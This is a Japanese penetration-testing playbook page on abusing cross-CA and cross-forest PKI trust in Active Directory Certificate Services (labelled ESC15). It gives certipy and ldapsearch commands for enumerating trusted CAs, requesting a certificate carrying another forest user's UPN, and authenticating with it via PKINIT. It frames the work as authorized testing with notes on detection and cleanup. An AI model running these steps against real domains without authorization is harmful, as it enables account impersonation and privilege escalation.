# ESC15 — Cross CA Enrollment + 信頼チェーン悪用

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。取得した証明書は案件終了時に CA で失効させること。
> 演習環境では制約なし。

---

## 着火条件

以下の状況で検討する：

- AD フォレストまたは別の PKI 階層に**複数の CA が存在する**（サブ CA・エンタープライズ CA・外部 CA）
- あるドメインの CA が発行した証明書を別のドメイン・フォレストの KDC が信頼している（クロスフォレスト PKI 信頼・UPN サフィックスルーティングの設定がある）
- **1 つの CA では ESC1〜ESC14 が悪用できなくても**、別の信頼された CA のテンプレートが緩い設定を持っている
- または `NTAuthCertificates` コンテナに第三者 CA の証明書が追加されている

**攻撃者の思考トレース：** AD は `NTAuthCertificates`（LDAP パス `CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,...`）に登録された CA の証明書のみを Kerberos 認証に使用できる。クロス CA の信頼関係がある環境では、フォレスト A の KDC が信頼する CA 証明書リストにフォレスト B の CA が含まれる場合があり、フォレスト B 側で脆弱なテンプレートを悪用した証明書がフォレスト A での PKINIT 認証に使えることがある。

> **注意（ESC15 は構成依存が最も強く PoC はほぼ存在しない）：** クロス CA 信頼の悪用は環境の PKI 設計に完全依存する。汎用的な再現手順が確立しておらず、個別環境での確認とデバッグが大量に必要になる。本ファイルは「確認すべき観点」を中心に記述し、具体的な手順は一般論に留める。

---

## 環境前提

- **実行環境**: テスター端末（複数フォレスト/ドメインへのネットワーク到達性があること）
- **必要なツール**:
  - Certipy（`pip install certipy-ad --break-system-packages`。要インストール確認）
  - `ldapsearch` または PowerShell AD モジュール（`NTAuthCertificates` 確認用）
- **必要な権限**: 各ドメインのドメインユーザー（または Enrollment 権限を持つユーザー）
- **前提知識**: フォレスト間の信頼関係の種類（双方向・片方向・フォレスト信頼・外部信頼）の理解が必要

---

## 観点・着眼点

### 先に確認すること：複数 CA・クロス信頼の有無

```bash
# [Attacker] 現在のドメインの NTAuthCertificates に登録された CA を確認
ldapsearch \
  -H ldap://[DC_IP] \
  -x -D "[USER]@[DOMAIN]" \
  -w "[PASSWORD]" \
  -b "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=[DOMAIN_PART],DC=[DOMAIN_PART]" \
  "(objectClass=certificationAuthority)" cACertificate
# → 複数の CA 証明書が含まれていれば複数 CA 信頼が設定されている
```

```bash
# [Attacker] Certipy で CA 情報を列挙（複数ドメインの CA を確認）
certipy find \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -stdout
# Certificate Authorities セクションに複数の CA が表示されるか確認
```

フォレスト信頼の確認（ターゲット環境に Windows シェルがある場合）：

```powershell
# [Target] フォレスト/ドメイン信頼関係を確認
Get-ADTrust -Filter * | Select-Object Name,TrustType,TrustDirection,IntraForest
# または
nltest /domain_trusts
```

### 何が出たら次に何をするか

| シグナル | 判断 |
|---------|------|
| `NTAuthCertificates` に複数の CA 証明書が含まれる | 信頼された各 CA の脆弱テンプレートを個別に `certipy find` で確認する |
| フォレスト信頼が `TrustType: Forest` で双方向 | クロスフォレスト PKINIT の可能性あり。別フォレスト側の CA テンプレートも調査する |
| 別 CA のテンプレートが ESC1〜ESC8 に相当する設定を持つ | そのテンプレートに対して該当 ESC の手順を適用する |
| すべての CA のテンプレートに脆弱設定がない | ESC15（クロス CA）の悪用はほぼ不可。他の手法を確認する |

---

## 手順（概要）

ESC15 の「手順」は完全に個別環境依存であるため、汎用的なコマンドシーケンスを示すことが困難。以下は「確認フロー」として示す。

事前準備（必須）：時刻同期（各フォレスト/ドメインの DC に対して実施）

```bash
# [Attacker] 各 DC との時刻同期
sudo ntpdate -u [DC_IP_FOREST_A]
sudo ntpdate -u [DC_IP_FOREST_B]
```

### Step 1: 信頼された各 CA のテンプレートを確認する

```bash
# [Attacker] フォレスト A の CA テンプレートを確認
certipy find \
  -u [USER_A]@[DOMAIN_A] \
  -p "[PASSWORD_A]" \
  -dc-ip [DC_IP_A] \
  -vulnerable \
  -stdout

# [Attacker] フォレスト B の CA テンプレートを確認（アクセス権がある場合）
certipy find \
  -u [USER_B]@[DOMAIN_B] \
  -p "[PASSWORD_B]" \
  -dc-ip [DC_IP_B] \
  -vulnerable \
  -stdout
```

### Step 2: 脆弱テンプレートが発見された CA で証明書を申請する

発見された ESC の種別に応じて、対応する ESC ファイルの手順を適用する：

- テンプレートが ESC1 相当 → `ESC1.md` の手順
- テンプレートが ESC6 相当 → `ESC6.md` の手順
- その他 ESC → 対応するファイルを参照

```bash
# [Attacker] 脆弱テンプレートを持つ CA（フォレスト B）で証明書を申請
certipy req \
  -ca [CA_NAME_B] \
  -template [VULNERABLE_TEMPLATE_B] \
  -u [USER_B]@[DOMAIN_B] \
  -p "[PASSWORD_B]" \
  -dc-ip [DC_IP_B] \
  -upn [TARGET_UPN_FOREST_A]
# → フォレスト A のユーザー UPN を含む証明書を発行
```

### Step 3: フォレスト A の KDC に対して PKINIT 認証を試みる

```bash
# [Attacker] フォレスト B の CA が発行した証明書でフォレスト A に認証
certipy auth \
  -pfx [TARGET_USERNAME].pfx \
  -domain [DOMAIN_A] \
  -dc-ip [DC_IP_A]
# → フォレスト A の KDC が証明書を受け入れるかどうかは NTAuthCertificates の設定次第
```

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| `certipy auth` が `KDC_ERR_CLIENT_NOT_TRUSTED` | フォレスト A の `NTAuthCertificates` にフォレスト B の CA 証明書が含まれていない。PKINIT 信頼が確立していない |
| 各 CA のテンプレートに脆弱設定がない | ESC15 の悪用はほぼ不可能。各フォレストで独立して ESC1〜ESC14 を探索する |
| クロスフォレスト認証は通るが権限が低い | UPN が特権アカウントのものかどうか確認。対象アカウントのグループメンバーシップを確認する |
| フォレスト B へのアクセスがそもそもない | フォレスト A で取得できる権限を使ってフォレスト B への経路を確認する（`Get-ADTrust` / BloodHound のフォレスト間エッジ） |

---

## 注意点・落とし穴

- **クロス CA 信頼の悪用は非常に稀**：実環境で ESC15 に該当する PKI 設計は極めてまれ。他の ESC を先にすべて検討した上で最後の確認項目として扱う
- **`NTAuthCertificates` の変更は重大な操作**：`NTAuthCertificates` コンテナに CA 証明書を追加することで任意の CA を信頼させることは原理上可能だが、これは ESC5 や DA 権限なしには実行できない。また実行した場合の業務影響は甚大
- **UPN ルーティングとの区別**：フォレスト間の UPN サフィックスルーティングが設定されている環境では、フォレスト A の DC がフォレスト B の DC に認証を委任する場合がある。これは ESC15 とは別の経路なので混同しない
- **BloodHound のフォレスト間エッジを確認する**：`DCFor`・`TrustedBy` などのエッジがフォレスト間の信頼を示す。これを使って攻撃チェーンを可視化する

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。複数フォレストに影響が及ぶため、各フォレストのオーナーとの合意が必要
- **想定されるSIEM/EDR検知**: Event ID 4886・4887（各フォレストの CA）/ 4768（各フォレストの DC）/ フォレスト間の TGT 委任ログ / MDI アラート
- **業務影響リスク**: 証明書発行自体は業務影響なし。フォレスト間の認証操作はクロスフォレスト認証サービスへの影響の可能性
- **原状回復必須項目**: ✅ 発行した証明書を各 CA で失効 / ✅ 取得した NT ハッシュ・TGT・pfx ファイルの暗号化保管・案件終了時破棄
- **取得情報の取扱**: pfx ファイル・NT ハッシュ・TGT は暗号化保管、案件終了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `./Overview.md`
- 前：ESC5（`NTAuthCertificates` への Write 権限悪用。PKI オブジェクト改ざん） → `./ESC5.md`
- 前：各 ESC（1〜14）の個別手順 → 該当ファイルを参照
- 後：証明書取得後の DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
